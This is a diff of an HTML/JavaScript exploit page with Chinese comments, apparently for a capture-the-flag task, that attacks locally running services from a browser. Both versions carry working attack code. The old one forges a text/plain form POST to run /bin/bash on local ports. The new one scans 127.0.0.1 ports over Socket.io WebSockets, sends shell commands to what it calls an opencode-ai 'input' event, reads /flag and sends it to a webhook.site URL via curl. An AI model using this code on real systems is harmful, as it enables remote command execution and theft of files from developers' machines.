@@ -1,52 +1,43 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // 1. 务必确认你的 Webhook ID！！
-        const WEB_ID = '6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
-        const WEB_URL = `https://webhook.site/${WEB_ID}`;
-        
-        fetch(`${WEB_URL}?status=exploit_v5_start`);
+<script>
+    const WEBHOOK = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";
 
-        // 构造命令：修改权限 -> 读取 -> 发送
-        // 使用 Node.js 的 http 模块回传，因为它比 fetch 更稳定
-        const cmd = `chmod 444 /flag && node -e "const fs=require('fs'); const http=require('https'); const data=fs.readFileSync('/flag','utf8'); http.get('${WEB_URL}?flag='+encodeURIComponent(data))"`;
+    async function exploit(port) {
+        return new Promise((resolve) => {
+            // Socket.io 的默认路径
+            const ws = new WebSocket(`ws://127.0.0.1:${port}/socket.io/?EIO=4&transport=websocket`);
+            
+            ws.onopen = () => {
+                // 1. 发送 Socket.io 连接包
+                ws.send('40'); 
+                
+                // 2. 发送 Shell 命令
+                // 先改权限，再读 flag，最后发给 webhook
+                const cmd = `chmod 444 /flag && curl ${WEBHOOK}/$(cat /flag | base64)`;
+                
+                // Socket.io 的消息格式通常是 42["event", "data"]
+                // opencode-ai 1.2.x 监听的是 'input' 事件
+                ws.send(`42["input", "${cmd}\\n"]`);
+                
+                fetch(`${WEBHOOK}?status=success_port_${port}`);
+                resolve(true);
+            };
 
-        const payload = JSON.stringify({
-            command: '/bin/bash',
-            args: ['-c', cmd]
+            ws.onerror = () => resolve(false);
+            
+            // 3秒超时
+            setTimeout(() => { ws.close(); resolve(false); }, 3000);
         });
+    }
 
-        // 策略：依次尝试不同的端口和路径，每个尝试后延迟几秒
-        const targets = [
-            {p: 4096, path: '/pty'},
-            {p: 3000, path: '/api/shell'},
-            {p: 3000, path: '/run'}
-        ];
-
-        let index = 0;
-        function nextAttempt() {
-            if (index >= targets.length) return;
-            const target = targets[index++];
-            
-            console.log(`Trying ${target.p}${target.path}...`);
-            
-            const f = document.createElement('form');
-            f.action = `http://127.0.0.1:${target.p}${target.path}`;
-            f.method = 'POST';
-            f.enctype = 'text/plain'; // 关键：绕过 Preflight
-            
-            const i = document.createElement('input');
-            i.name = payload; // 将 JSON 注入键名
-            i.value = '';
-            
-            f.appendChild(i);
-            document.body.appendChild(f);
-            f.submit(); // 这一步会引起页面跳转，攻击请求随之发出
+    async function start() {
+        fetch(`${WEBHOOK}?status=scanning`);
+        // 优先尝试 4096，如果不成功再扫别的
+        if (await exploit(4096)) return;
+        
+        for (let p = 3000; p <= 3005; p++) {
+            await exploit(p);
         }
+    }
 
-        // 启动递归尝试
-        setTimeout(nextAttempt, 2000);
-    </script>
-</body>
-</html>
+    start();
+</script>
